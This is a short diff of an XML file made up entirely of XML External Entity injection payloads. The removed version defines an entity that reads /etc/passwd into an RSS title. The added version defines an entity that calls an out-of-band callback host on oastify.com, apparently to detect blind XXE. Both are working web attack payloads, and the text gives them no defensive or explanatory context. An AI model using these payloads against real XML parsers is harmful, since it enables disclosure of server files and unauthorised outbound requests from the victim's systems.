@@ -1,9 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!ENTITY file SYSTEM "file:///etc/passwd">
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://8x6iv7j92wm2i93lbgwuictpfgl79yzmo.oastify.com">
 ]>
-<rss version="2.0">
-  <channel>
-    <title>&file;</title>
-  </channel>
-</rss>
+<root>
+  <data>&xxe;</data>
+</root>
